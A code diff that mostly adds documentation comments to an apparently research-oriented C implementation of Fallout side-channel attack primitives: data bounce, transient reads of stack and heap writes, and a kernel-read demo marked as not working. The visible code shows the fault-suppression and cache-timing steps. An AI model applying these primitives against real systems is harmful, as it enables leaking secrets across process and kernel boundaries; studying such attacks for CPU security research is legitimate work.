@@ -22,7 +22,6 @@ int fallout_compatible() { return 0; }
 uint64_t *wtf_times;
 ssize_t page_size;
 uint8_t *attacker_address = (uint8_t *) 0xFFFF000000000000ull, *address_padding= (uint8_t*) UINT64_MAX;
-int tsx_available = 0;
 jmp_buf buf;
 
 
@@ -152,6 +151,13 @@ static inline int get_min(uint64_t* buffer, int len){
 #define FALLOUT_DATA_BOUNCE if (!setjmp(buf)) data_bounce_asm(ptr, mem, magic_number);
 #endif
 
+
+/**
+ * Perform a data bounce at a specified virtual address (for inline use)
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param ptr The address to perform the data bounce at
+ * @return Did the value bounce back?
+ */
 static inline int _data_bounce(void *mem, void *ptr) {
     int i;
     char magic_number = 42;
@@ -166,7 +172,13 @@ static inline int _data_bounce(void *mem, void *ptr) {
     int min_i = get_min(wtf_times, 256);
     return min_i == magic_number;
 }
-
+/**
+ * Perform a number of data bounces at a specified virtual address
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param ptr The address to perform the data bounce at
+ * @param repeats How often to repeat the data bounce.
+ * @return The number of successful data bounces
+ */
 int data_bounce(void *mem, void *ptr, int repeats){
     int i, hits = 0;
     for(i = 0; i < repeats; i++) {
@@ -214,6 +226,14 @@ int flush_cache(void *mem){
 #define FALLOUT_FAULTY_LOAD if (!setjmp(buf)) maccess(mem + page_size * attacker_address[page_offset]);
 #endif
 
+/**
+ * Use WTF to observe a write to the heap
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param page_offset The page offset of the write access to observe.
+ * @param secret_value The secret value to be written
+ * @return Was the read successful?
+ */
+
 int toy_wtf(void *mem, int page_offset, int secret_value) {
     uint8_t* test = aligned_alloc(page_size, page_size);
     flush_mem(mem);
@@ -232,6 +252,13 @@ void toy_write(int offset, uint8_t secret){
     ((uint8_t*)((uint64_t)(&buffer[4096]) & (UINT64_MAX ^ 0xFFF)))[offset] = secret;
 }
 
+/**
+ * Use WTF to observe a write to the stack
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param page_offset The page offset of the write access to observe.
+ * @param secret_value The secret value to be written
+ * @return Was the read successful?
+ */
 volatile int toy_wtf_v2(void *mem, int page_offset, int secret_value) {
     uint8_t* test = aligned_alloc(page_size, page_size);
     flush_mem(mem);
@@ -244,7 +271,12 @@ volatile int toy_wtf_v2(void *mem, int page_offset, int secret_value) {
     munmap(test, page_size);
     return get_min(wtf_times, 256) == secret_value;
 }
-
+/**
+ * Attempts a WTF read (for inline use).
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param page_offset The page offset of the write access to observe.
+ * @return The result of the attempted read
+ */
 static inline int _wtf(void *mem, int page_offset) {
     int i;
     FALLOUT_FAULTY_LOAD
@@ -253,6 +285,12 @@ static inline int _wtf(void *mem, int page_offset) {
     }
     return get_min(wtf_times, 256);
 }
+/**
+ * Attempts a WTF read.
+ * @param mem A pointer to a page aligned memory region >= <page size> * 256 bytes
+ * @param page_offset The page offset of the write access to observe.
+ * @return The result of the attempted read
+ */
 
 int wtf(void *mem, int page_offset) {
     return _wtf(mem, page_offset);
@@ -264,6 +302,12 @@ int wtf(void *mem, int page_offset) {
 #define FALLOUT_FAULTY_LOAD_K if (!setjmp(buf)) maccess(mem + (attacker_address_k[(response[1]<<8)|response[2]]<<12));
 #endif
 
+/**
+ * WTF function for the kernel-read demo. It currently does not work.
+ * @param mem
+ * @param procfile
+ * @return
+ */
 int kernel_wtf(void* mem, int procfile){
     uint8_t *attacker_address_k = aligned_alloc(page_size, page_size);
     mprotect(attacker_address_k, page_size, PROT_NONE);
@@ -283,7 +327,9 @@ int kernel_wtf(void* mem, int procfile){
     return result == (uint8_t)response[0];
 }
 
-
+/**
+ * Init function, should be called before any other function from this file is used
+ */
 int fallout_init() {
 #ifndef TSX_AVAILABLE
     if (signal(SIGSEGV, segfault_handler) == SIG_ERR) {
@@ -296,6 +342,9 @@ int fallout_init() {
     return 1;
 }
 
+/**
+ * Cleanup function, should be called after use
+ */
 void fallout_cleanup(){
     free(wtf_times);
 }
